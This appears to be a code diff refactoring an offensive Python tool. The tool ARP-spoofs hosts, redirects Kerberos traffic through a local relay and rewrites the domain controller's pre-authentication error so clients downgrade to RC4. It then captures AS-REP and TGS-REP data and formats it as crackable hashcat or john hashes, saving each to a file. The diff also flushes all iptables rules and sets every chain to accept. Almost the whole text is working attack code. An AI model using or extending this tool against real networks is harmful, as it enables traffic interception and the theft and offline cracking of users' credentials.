@@ -22,8 +22,46 @@ import logging
 decoder = asn1.Decoder()
 stop_arp_spoofing_flag = threading.Event()
 
+def print_asrep_hash(username,domain,etype,cipher):
+    if HashFormat == 'hashcat':
+        if etype == 17 or etype == 18 :
+            HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
+        else :
+            HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
+    else :
+        if etype == 17 or etype == 18 :
+            HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
+        else :
+            HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
+    print(colored(f'[+] Hash to crack : {HashToCrack}', 'green', attrs=['bold']))
+    if etype == 17 and HashFormat == 'hashcat' :
+        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32100 ')
+    if etype == 18 and HashFormat == 'hashcat' :
+        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32200 ')
+    with open(outfile, 'a') as f:
+        f.write(HashToCrack + '\n')
 
-def handle_KRB_AS_REP(packet):
+def handle_as_rep(packet):
+    decoder.start(bytes(packet.root.cname.nameString[0]))
+    username = decoder.read()[1].decode().lower()
+    decoder.start(bytes(packet.root.crealm))
+    domain = decoder.read()[1].decode().lower()
+    logging.info(f'[+] Got ASREP for username : {username}@{domain}')
+    decoder.start(bytes(packet.root.encPart.etype))
+    etype = decoder.read()[1]
+    decoder.start(bytes(packet.root.encPart.cipher))
+    cipher = decoder.read()[1].hex()
+    if username in UsernamesCaptured and etype in UsernamesCaptured[username] :
+        logging.info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...')
+        return
+    else :
+        if username in UsernamesCaptured :
+            UsernamesCaptured[username].append(etype)
+        else :
+            UsernamesCaptured[username] = [etype]
+    print_asrep_hash(username, domain, etype, cipher)
+
+def parse_dc_response(packet):
     if packet.haslayer(KRB_TGS_REP):
         decoder.start(bytes(packet.root.cname.nameString[0]))
         username = decoder.read()[1].decode().lower()
@@ -50,31 +88,15 @@ def handle_KRB_AS_REP(packet):
     etype = decoder.read()[1]
     decoder.start(bytes(packet.root.encPart.cipher))
     cipher = decoder.read()[1].hex()
-    if HashFormat == 'hashcat':
-        if etype == 17 or etype == 18 :
-            HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
-        else :
-            HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
-    else :
-        if etype == 17 or etype == 18 :
-            HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
-        else :
-            HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
     if username in UsernamesCaptured and etype in UsernamesCaptured[username] :
         logging.info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...')
         return
     else :
-        print(colored(f'[+] Found hash to crack : {HashToCrack}', 'green', attrs=['bold']))
         if username in UsernamesCaptured :
             UsernamesCaptured[username].append(etype)
         else :
             UsernamesCaptured[username] = [etype]
-    if etype == 17 and HashFormat == 'hashcat' :
-        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32100 ')
-    if etype == 18 and HashFormat == 'hashcat' :
-        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32200 ')
-    with open(outfile, 'a') as f:
-        f.write(HashToCrack + '\n')
+    print_asrep_hash(username,domain,etype,cipher)
     if mode == 'listen' and not keep_spoofing and not disable_spoofing :
         Targets.remove(packet[IP].dst)
         restore(gw,packet[IP].dst)
@@ -84,7 +106,7 @@ def handle_KRB_AS_REP(packet):
 
 def listen_mode():
     try :
-        sniff(filter=f"src port 88", prn=handle_KRB_AS_REP)
+        sniff(filter=f"src port 88", prn=parse_dc_response)
     except KeyboardInterrupt :
         pass
     except Exception as e :
@@ -171,8 +193,8 @@ def is_valid_ipwithmask(ip_with_mask):
 
 
 async def handle_client(reader, writer):
-    client_address = writer.get_extra_info('peername')[0]
-    logging.debug(f"[+] Connection from {client_address}")
+    client_ip = writer.get_extra_info('peername')[0]
+    logging.debug(f"[+] Connection from {client_ip}")
 
     try:
         while True:
@@ -180,7 +202,7 @@ async def handle_client(reader, writer):
             if not data:
                 break
 
-            dc_response = await relay_to_dc(data, client_address)
+            dc_response = await relay_to_dc(data, client_ip)
             writer.write(dc_response)
             await writer.drain()
 
@@ -190,29 +212,57 @@ async def handle_client(reader, writer):
     finally:
         writer.close()
 
-async def relay_to_dc(data, client_address):
-    host = dc
-    kerberos_packet = KerberosTCPHeader(data)
-    if kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 :
-        decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
-        username = decoder.read()[1].decode().lower()
-        decoder.start(bytes(kerberos_packet.root.reqBody.realm))
-        domain = decoder.read()[1].decode().lower()
-        if ASN1_INTEGER(23) in kerberos_packet.root.reqBody.etype :
-            if username not in UsernamesCaptured :
-                logging.info(f'[+] AS-REQ coming from {client_address} for {username}@{domain} : RC4 is supported by the client. The downgrade attack could work')
-        else :
-            logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
-    
+async def relay_without_modification_to_dc(data):
     reader, writer = await asyncio.open_connection(dc,88)
     writer.write(data)
     await writer.drain()
     response = await reader.read(2048)
     writer.close()
     await writer.wait_closed()
-    krb_response = KerberosTCPHeader(response)
+    return response
 
-    if krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19 :
+async def relay_tgsreq_to_dc(data):
+    response = await relay_without_modification_to_dc(data)
+    kerberos_packet = KerberosTCPHeader(response)
+    if not kerberos_packet.haslayer(KRB_TGS_REP):
+        return response
+    decoder.start(bytes(kerberos_packet.root.cname.nameString[0]))
+    username = decoder.read()[1].decode().lower()
+    decoder.start(bytes(kerberos_packet.root.crealm))
+    domain = decoder.read()[1].decode().lower()
+    if username not in UsernamesSeen and username not in UsernamesCaptured :
+        if username.endswith('$') :
+            logging.debug(f'[+] Sniffed TGS-REP for user {username}@{domain}')
+        else :
+            logging.info(f'[+] Sniffed TGS-REP for user {username}@{domain}')
+        UsernamesSeen.add(username)
+        return response
+    return response
+
+async def relay_asreq_to_dc(data, client_ip):
+    kerberos_packet = KerberosTCPHeader(data)
+    decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
+    username = decoder.read()[1].decode().lower()
+    decoder.start(bytes(kerberos_packet.root.reqBody.realm))
+    domain = decoder.read()[1].decode().lower()
+
+    if username.endswith('$') :
+        logging.debug(f'[*] AS-REQ coming for computer account {username}@{domain}. Relaying...')
+        return await relay_without_modification_to_dc(data)
+
+    if username in UsernamesCaptured and 23 in UsernamesCaptured[username] :
+        logging.info(f'[*] RC4 hash already captured for {username}@{domain}. Relaying...')
+        return await relay_without_modification_to_dc(data)
+
+    if len(kerberos_packet.root.padata) != 2 :
+        if ASN1_INTEGER(23) not in kerberos_packet.root.reqBody.etype :
+            logging.warning(f'[-] AS-REQ coming from {client_ip} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
+            return await relay_without_modification_to_dc(data)
+        logging.info(f'[+] AS-REQ coming from {client_ip} for {username}@{domain}')
+        response = await relay_without_modification_to_dc(data)
+        krb_response = KerberosTCPHeader(response)
+        if not (krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19) :
+            return response
         RC4_present = False
         indexes_to_delete = []
         for idx, x in enumerate(krb_response.root.eData[0].seq[0].padataValue.seq) :
@@ -220,28 +270,39 @@ async def relay_to_dc(data, client_address):
                 RC4_present = True
             else :
                 indexes_to_delete.append(idx)
-            if type(x.salt) == ASN1_GENERAL_STRING:
-                decoder.start(bytes(x.salt))
-                salt = decoder.read()[1].decode().lower()
-                if bool(re.search(r'([a-z0-9]+\.[a-z0-9]+)host.*\1$', salt)) :
-                    logging.info(f'[+] Machine account. Skipping RC4 downgrading...')
-                    return response
         if not RC4_present :
             logging.warning("[!] RC4 not found in DC's supported algorithms. Downgrade to RC4 will not work")
             return response
-        logging.info('[+] Hijacking Kerberos encryption negotiation...')
+        logging.info(f'[+] Hijacking Kerberos encryption negotiation for {username}@{domain}...')
         for i in indexes_to_delete :
             del krb_response.root.eData[0].seq[0].padataValue.seq[i]
         krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos])) 
         return bytes(krb_response[KerberosTCPHeader])
-    if krb_response.haslayer(KRB_AS_REP) or krb_response.haslayer(KRB_TGS_REP):
-        handle_KRB_AS_REP(krb_response)
+    
+    response = await relay_without_modification_to_dc(data)
+    krb_response = KerberosTCPHeader(response)
+    if krb_response.haslayer(KRB_AS_REP):
+        handle_as_rep(krb_response)
         if not keep_spoofing and not disable_spoofing :
-            if client_address in Targets : Targets.remove(client_address)
-            restore(client_address, gw)
-            logging.info(f'[+] Restored arp cache of {client_address}')
+            if client_ip in Targets : Targets.remove(client_ip)
+            restore(client_ip, gw)
+            logging.info(f'[+] Restored arp cache of {client_ip}')
         return response
     return response
+
+         
+
+    
+async def relay_to_dc(data, client_ip):
+    kerberos_packet = KerberosTCPHeader(data)
+
+    if kerberos_packet.haslayer(KRB_TGS_REQ):
+        return await relay_tgsreq_to_dc(data)
+   
+    if kerberos_packet.haslayer(KRB_AS_REQ):
+        return await relay_asreq_to_dc(data, client_ip)
+    
+    return await relay_without_modification_to_dc(data)
 
 async def kerberos_server():
     try :
@@ -249,8 +310,15 @@ async def kerberos_server():
     except Exception as e :
         logging.error(f'[!] Could not back up iptables : {e}')
         sys.exit(1)
-    os.system("iptables -F")
-    os.system("iptables -F -t nat")
+    os.system('''sudo iptables -F
+                sudo iptables -X
+                sudo iptables -t nat -F
+                sudo iptables -t nat -X
+                sudo iptables -t mangle -F
+                sudo iptables -t mangle -X
+                sudo iptables -P INPUT ACCEPT
+                sudo iptables -P OUTPUT ACCEPT
+                sudo iptables -P FORWARD ACCEPT''')
     logging.debug('[*] Saved current iptables\n\n')
     os.system(f'iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 88 -j DNAT --to 127.0.0.1:88')
     os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=1 1>/dev/null')
